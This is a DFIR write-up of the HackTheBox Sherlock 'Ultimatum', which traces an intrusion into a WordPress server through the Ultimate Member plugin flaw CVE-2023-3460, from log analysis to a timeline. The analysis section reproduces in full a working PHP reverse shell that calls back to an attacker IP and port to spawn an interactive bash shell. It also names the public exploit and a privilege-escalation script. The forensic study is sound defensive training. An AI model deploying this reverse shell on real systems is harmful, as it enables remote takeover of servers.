---
title: "HTB Sherlock Ultimatum"
date: 2024-05-27T13:25:02+02:00
tags:
  - htb
  - sherlock
  - ultimatum
  - dfir
  - linux
  - worpress
  - plugin
  - ultimate
  - member
  - CVE-2023-3460
  - LinuxCatScale
image:
---

# [Ultimatum (DFIR)](https://app.hackthebox.com/sherlocks/Ultimatum)

## Scenario
One of the Forela WordPress servers was a target of notorious Threat Actors (TA). The website was running a blog dedicated to the Forela Social Club, where Forela employees can chat and discuss random topics. Unfortunately, it became a target of a threat group. The SOC team believes this was due to the blog running a vulnerable plugin. The IT admin already followed the acquisition playbook and triaged the server for the security team. Ultimately (no pun intended) it is your responsibility to investigate the incident. Step in and confirm the culprits behind the attack and restore this important service within the Forela environment.

## Forensics

### Artifacts
We are given an archive `ultimatum.zip` with a `sha256sum:101ae8258f9a2a821bdc78e4f2b61deb2337cffb95e58c4dfe8cd4e57ca75a66`.

Upon extracting the archive use [Extract-Cat-Scale.sh](https://github.com/WithSecureLabs/LinuxCatScale/blob/master/Extract-Cat-Scale.sh) we get the following artifacts:

```
-rwxrwxrwx 1 root root 1732 Aug  8  2023 ip-172-31-11-131-20230808-0937-console-error-log.txt

Docker:
total 0

Logs:
total 488
-rwxrwxrwx  1 root root 451801 Aug  8  2023 ip-172-31-11-131-20230808-0937-last-btmp.txt
-rwxrwxrwx  1 root root    329 Aug  8  2023 ip-172-31-11-131-20230808-0937-last-utmp.txt
-rwxrwxrwx  1 root root    606 Aug  8  2023 ip-172-31-11-131-20230808-0937-last-utmpdump.txt
-rwxrwxrwx  1 root root    732 Aug  8  2023 ip-172-31-11-131-20230808-0937-last-wtmp.txt
-rwxrwxrwx  1 root root   2397 Aug  8  2023 ip-172-31-11-131-20230808-0937-lastlog.txt
-rwxrwxrwx  1 root root    396 Aug  8  2023 ip-172-31-11-131-20230808-0937-passwd-check.txt
-rwxrwxrwx  1 root root     12 Aug  8  2023 ip-172-31-11-131-20230808-0937-var-crash-list.txt
-rwxrwxrwx  1 root root    115 Aug  8  2023 ip-172-31-11-131-20230808-0937-var-crash.tar.gz
-rwxrwxrwx  1 root root   2975 Aug  8  2023 ip-172-31-11-131-20230808-0937-var-log-list.txt
-rwxrwxrwx  1 root root    291 Aug  8  2023 ip-172-31-11-131-20230808-0937-who.txt
-rwxrwxrwx  1 root root    360 Aug  8  2023 ip-172-31-11-131-20230808-0937-whoandwhat.txt
drwxrwxrwx 12 root root   4096 May 27 10:10 varlogs

Misc:
total 74804
-rwxrwxrwx 1 root root      559 Aug  8  2023 ip-172-31-11-131-20230808-0937-Setuid-Setguid-tools.txt
-rwxrwxrwx 1 root root       62 Aug  8  2023 ip-172-31-11-131-20230808-0937-dev-dir-files-hashes.txt
-rwxrwxrwx 1 root root       92 Aug  8  2023 ip-172-31-11-131-20230808-0937-dev-dir-files.txt
-rwxrwxrwx 1 root root   384887 Aug  8  2023 ip-172-31-11-131-20230808-0937-exec-perm-files.txt
-rwxrwxrwx 1 root root 34211795 Aug  8  2023 ip-172-31-11-131-20230808-0937-full-timeline.csv
-rwxrwxrwx 1 root root 41585177 Aug  8  2023 ip-172-31-11-131-20230808-0937-pot-webshell-first-1000.txt
-rwxrwxrwx 1 root root   392840 Aug  8  2023 ip-172-31-11-131-20230808-0937-pot-webshell-hashes.txt

Persistence:
total 116
drwxrwxrwx 2 root root  4096 May 27 10:10 crontabs
-rwxrwxrwx 1 root root   120 Aug  8  2023 ip-172-31-11-131-20230808-0937-cron-folder-list.txt
-rwxrwxrwx 1 root root   147 Aug  8  2023 ip-172-31-11-131-20230808-0937-cron-tab-list.txt
-rwxrwxrwx 1 root root 45449 Aug  8  2023 ip-172-31-11-131-20230808-0937-persistence-systemdlist.txt
-rwxrwxrwx 1 root root   775 Aug  8  2023 ip-172-31-11-131-20230808-0937-service_status.txt
-rwxrwxrwx 1 root root 27513 Aug  8  2023 ip-172-31-11-131-20230808-0937-systemctl_all.txt
-rwxrwxrwx 1 root root 23761 Aug  8  2023 ip-172-31-11-131-20230808-0937-systemctl_service_status.txt

Podman:
total 0

Process_and_Network:
total 5008
drwxrwxrwx 3 root root    4096 May 27 10:10 cyberjunkie_admin
-rwxrwxrwx 1 root root     671 Aug  8  2023 ip-172-31-11-131-20230808-0937-ip-a.txt
-rwxrwxrwx 1 root root     439 Aug  8  2023 ip-172-31-11-131-20230808-0937-iptables-numerical.txt
-rwxrwxrwx 1 root root     275 Aug  8  2023 ip-172-31-11-131-20230808-0937-iptables.txt
-rwxrwxrwx 1 root root       0 Aug  8  2023 ip-172-31-11-131-20230808-0937-lsof-list-open-files.txt
-rwxrwxrwx 1 root root    5474 Aug  8  2023 ip-172-31-11-131-20230808-0937-process-cmdline.txt
-rwxrwxrwx 1 root root  148446 Aug  8  2023 ip-172-31-11-131-20230808-0937-process-details.txt
-rwxrwxrwx 1 root root   28377 Aug  8  2023 ip-172-31-11-131-20230808-0937-process-environment.txt
-rwxrwxrwx 1 root root   11080 Aug  8  2023 ip-172-31-11-131-20230808-0937-process-exe-links.txt
-rwxrwxrwx 1 root root  111180 Aug  8  2023 ip-172-31-11-131-20230808-0937-process-fd-links.txt
-rwxrwxrwx 1 root root 1241355 Aug  8  2023 ip-172-31-11-131-20230808-0937-process-map_files-link-hashes.txt
-rwxrwxrwx 1 root root 3463139 Aug  8  2023 ip-172-31-11-131-20230808-0937-process-map_files-links.txt
-rwxrwxrwx 1 root root   11524 Aug  8  2023 ip-172-31-11-131-20230808-0937-processes-axwwSo.txt
-rwxrwxrwx 1 root root    2991 Aug  8  2023 ip-172-31-11-131-20230808-0937-processhashes.txt
-rwxrwxrwx 1 root root     211 Aug  8  2023 ip-172-31-11-131-20230808-0937-routetable.txt
-rwxrwxrwx 1 root root   49785 Aug  8  2023 ip-172-31-11-131-20230808-0937-ss-anepo.txt
-rwxrwxrwx 1 root root     190 Aug  8  2023 ip-172-31-11-131-20230808-0937-ssh-folders-list.txt
drwxrwxrwx 3 root root    4096 May 27 10:10 root
drwxrwxrwx 3 root root    4096 May 27 10:10 ubuntu

System_Info:
total 340
drwxrwxrwx 30 root root   4096 May 27 10:10 etc-modified-files
-rwxrwxrwx  1 root root   1968 Aug  8  2023 ip-172-31-11-131-20230808-0937-cpuinfo.txt
-rwxrwxrwx  1 root root     76 Aug  8  2023 ip-172-31-11-131-20230808-0937-deb-package-verify.txt
-rwxrwxrwx  1 root root 104466 Aug  8  2023 ip-172-31-11-131-20230808-0937-deb-packages.txt
-rwxrwxrwx  1 root root   1126 Aug  8  2023 ip-172-31-11-131-20230808-0937-df.txt
-rwxrwxrwx  1 root root  54667 Aug  8  2023 ip-172-31-11-131-20230808-0937-dmesg.txt
-rwxrwxrwx  1 root root      0 Aug  8  2023 ip-172-31-11-131-20230808-0937-etc-key-files-list.txt
-rwxrwxrwx  1 root root   4990 Aug  8  2023 ip-172-31-11-131-20230808-0937-etc-modified-files-list.txt
-rwxrwxrwx  1 root root     38 Aug  8  2023 ip-172-31-11-131-20230808-0937-host-date-timezone.txt
-rwxrwxrwx  1 root root   1863 Aug  8  2023 ip-172-31-11-131-20230808-0937-lsmod.txt
-rwxrwxrwx  1 root root      0 Aug  8  2023 ip-172-31-11-131-20230808-0937-lsusb.txt
-rwxrwxrwx  1 root root   1391 Aug  8  2023 ip-172-31-11-131-20230808-0937-meminfo.txt
-rwxrwxrwx  1 root root 112329 Aug  8  2023 ip-172-31-11-131-20230808-0937-modinfo.txt
-rwxrwxrwx  1 root root   5151 Aug  8  2023 ip-172-31-11-131-20230808-0937-module-sha1.txt
-rwxrwxrwx  1 root root   4348 Aug  8  2023 ip-172-31-11-131-20230808-0937-mount.txt
-rwxrwxrwx  1 root root   2446 Aug  8  2023 ip-172-31-11-131-20230808-0937-procmod.txt
-rwxrwxrwx  1 root root    526 Aug  8  2023 ip-172-31-11-131-20230808-0937-release.txt
-rwxrwxrwx  1 root root   4570 Aug  8  2023 ip-172-31-11-131-20230808-0937-sudo.txt

User_Files:
total 8
drwxrwxrwx 5 root root 4096 May 27 10:10 hidden-user-home-dir
-rwxrwxrwx 1 root root  315 Aug  8  2023 hidden-user-home-dir-list.txt

Virsh:
total 0
```

### Tools

- Visual Studio Code
- Sublime Text Editor
- [LinuxCatScale](https://github.com/WithSecureLabs/LinuxCatScale) to extract the archive.

### Analysis

The web server was `Apache v2.4.41-4ubuntu3.14` and it was running `WordPress v6.2.2` on `Ubuntu 20.04.6 LTS (Focal Fossa)` with a kernel version of `5.15.0-1036-aws`.

The server was triaged and we were provided artifacts following the `acquisition playbook`. Because this was an attack on the webserver most of the analysis for **Initial Foothold** will revolve around analyzing the `access.log`.

From the access log, we see a lot of HTTP requests coming in and out of the server from an IP `23.106.60.163` with the user agent `WPScan v3.8.24 (https://wpscan.com/wordpress-security-scanner)`. The TA used this IP to scan Forella's WordPress blog for vulnerabilities. 

`WPScanner` is an automated security auditing tool for WordPress. It scans the WordPress version and its plugins. themes and various other components to check for known vulnerabilities or weaknesses.

The log shows that the TA was successful in identifying a vulnerable plugin. It was [Ultimate-Member - User Profile, Registration, Login, Member Directory, Content Restriction & Membership Plugin](https://ultimatemember.com/), the version that was installed on Forella's WordPress site was `v2.6.4`.

According to [Mitre](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-3460) - *The Ultimate Member WordPress plugin before 2.6.7 does not prevent visitors from creating user accounts with arbitrary capabilities, effectively allowing attackers to create administrator accounts at will. This is actively being exploited in the wild.* The CVE assigned was `CVE-2023-3460` with a CVSS (v3.x) base score of `9.8 CRITICAL`. The exploit for this CVE was publicly available at the time of the attack.

After identifying the vulnerability, the TA used a [PoC published on GitHub](https://github.com/gbrsh/CVE-2023-3460) by a security research firm named [Secragon](https://secragon.com/). It was confirmed by analyzing the script's User Agents which were `python-requests/2.28.1` and `Secragon Offensive Agen`.

Therefore, successfully creating an admin user named `secragon` the TA switched his IP to `198.16.74.45` and manually browsed the admin dashboard. We can confirm this by their User Agent `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0`.

To get a foothold on the server the TA created a malicious theme, which served as a reverse shell to perform Remote Command Execution. They created the file here `/var/www/html/wp-content/themes/twentytwentythree/patterns/hidden-comments.php`. The code for the reverse shell is below.

```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '43.204.24.76';
$port = 6969;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

From this code we can see the C2 server `43.204.24.76:6969` and the command `uname -a; w; id; /bin/bash -i` the web shell executed on behalf of the TA. First, the web shell created a process with PID `234471` to execute the shell's payload. Then for `/bin/bash -i` command it created an interactive bash shell with the PID `234517`.

```
www-data  234517  234471   2616   596 ?        S    09:01 00:00:00 sh -c uname -a; w; id; /bin/bash -i
www-data  234521  234517   4248  3444 ?        S    09:01 00:00:00 /bin/bash -i
```

To elevate the shell's privilege the attacker used a bash script `LinEnum.sh` to enumerate potential privilege escalation vectors. The TA uploaded `LinEnum.sh` to `/tmp` and then `/dev/shm` directory.

```
7,1,/dev/shm/LinEnum.sh,2023-08-08 09:33:05.917203555 +0000,2023-08-08 09:32:38.650234799 +0000,2023-08-08 09:32:46.345943752 +0000,-,www-data,www-data,-rwxrwxrwx,46631
```

And they were successful in gaining root access. From the `auth.log` we see that the TA logged into SSH using `ubuntu` user's private SSH key using another IP `203.101.190.9`. Then escalate their privilege to `root` using su.

Immediately after that, the threat actor created an account `cyberjunkie_admin` for persistence.

```
Aug  7 13:50:25 ip-172-31-11-131 sshd[229515]: Accepted publickey for ubuntu from 203.101.190.9 port 42564 ssh2: RSA SHA256:c/25gw2HCe4yy/6f4eAd5O1dvdGebtUFKOEVAh7kmzk
Aug  7 13:50:25 ip-172-31-11-131 sshd[229515]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
Aug  7 13:50:25 ip-172-31-11-131 systemd-logind[523]: New session 1971 of user ubuntu.
Aug  7 13:50:31 ip-172-31-11-131 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/su
Aug  7 13:50:31 ip-172-31-11-131 sudo: pam_unix(sudo:session): session opened for user root by ubuntu(uid=0)
Aug  7 13:50:31 ip-172-31-11-131 su: (to root) ubuntu on pts/0
Aug  7 13:50:31 ip-172-31-11-131 su: pam_unix(su:session): session opened for user root by ubuntu(uid=0)
Aug  7 13:53:08 ip-172-31-11-131 sshd[126847]: Received SIGHUP; restarting.
Aug  7 13:53:08 ip-172-31-11-131 sshd[126847]: Server listening on 0.0.0.0 port 22.
Aug  7 13:53:08 ip-172-31-11-131 sshd[126847]: Server listening on :: port 22.
Aug  7 13:55:36 ip-172-31-11-131 groupadd[229659]: group added to /etc/group: name=cyberjunkie_admin, GID=1001
Aug  7 13:55:36 ip-172-31-11-131 groupadd[229659]: group added to /etc/gshadow: name=cyberjunkie_admin
Aug  7 13:55:36 ip-172-31-11-131 groupadd[229659]: new group: name=cyberjunkie_admin, GID=1001
Aug  7 13:55:36 ip-172-31-11-131 useradd[229665]: new user: name=cyberjunkie_admin, UID=1001, GID=1001, home=/home/cyberjunkie_admin, shell=/bin/bash, from=/dev/pts/0
Aug  7 13:55:58 ip-172-31-11-131 passwd[229677]: pam_unix(passwd:chauthtok): password changed for cyberjunkie_admin
Aug  7 13:56:18 ip-172-31-11-131 chfn[229679]: changed user 'cyberjunkie_admin' information
Aug  7 13:59:25 ip-172-31-11-131 su: (to cyberjunkie_admin) ubuntu on pts/0
Aug  7 13:59:25 ip-172-31-11-131 su: pam_unix(su:session): session opened for user cyberjunkie_admin by ubuntu(uid=0)
```


Closely examining the sudoers permission file we found a `very risky configuration` that allowed the `ubuntu` user to perform tasks as `root` without authentication.

```
# Created by cloud-init v. 23.1.2-0ubuntu0~20.04.1 on Wed, 12 Jul 2023 11:41:45 +0000

# User rules for ubuntu
ubuntu ALL=(ALL) NOPASSWD:ALL
```


## Timeline
- **Reconnaissance:** On `2023-08-08 08:21:27` the TA started the scanner using IP `23.106.60.163`.

- **Weaponization & Delivery:** On `2023-08-08 08:32:50` The TA identified the vulnerable WordPress plugin `Ultimate Member v2.6.4`.

- **Exploitation:** On `2023-08-08 08:33:58` the TA successfully exploited CVE-2023-3460 and added an Admin user `secragon`.

- **Installation:** On `2023-08-08 08:58:02` the TA created a reverse web shell `/var/www/html/wp-content/themes/twentytwentythree/patterns/hidden-comments.php`. The TA did this from an IP `198.16.74.45`. After that, on `2023-08-08 09:06:53` the TA uploaded a Bash Script `LinEnum.sh` inside the `/tmp` folder then he moved it to the `/dev/shm` on `2023-08-08 09:32:38`.

- **Command and Control:** The TA used IP `43.204.24.76` and port `6969` as a C2 server.


## Remarks
Analyzing the log file indicates that the server was already compromised on `2023-08-07 13:50:25` by another threat actor who logged into the SSH account of `ubuntu` user from IP `203.101.190.9` using SSH key and created a backdoor admin account `cyberjunkie_admin` on `2023-08-07 13:55:36`. The account seems to be dormant but that TA (`203.101.190.9`) also compromised the MySQL Database. 
